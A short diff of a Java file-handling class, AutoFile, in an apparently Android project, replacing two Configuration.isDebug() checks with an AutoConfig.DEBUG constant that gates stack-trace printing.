@@ -19,6 +19,7 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.util.Date;
 
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
@@ -80,7 +81,7 @@ public final class AutoFile {
 			in.read(buffer, 0, length);
 			return buffer;
 		} catch (final IOException e) {
-			if(Configuration.isDebug()) { e.printStackTrace(); }
+			if(AutoConfig.DEBUG) { e.printStackTrace(); }
 
 		} finally {
 			if (in != null) {
@@ -88,7 +89,7 @@ public final class AutoFile {
 					in.close();
 				} catch (final IOException e) {
 					// TODO Auto-generated catch block
-					if(Configuration.isDebug()) { e.printStackTrace(); }
+					if(AutoConfig.DEBUG) { e.printStackTrace(); }
 				}
 			}
 		}
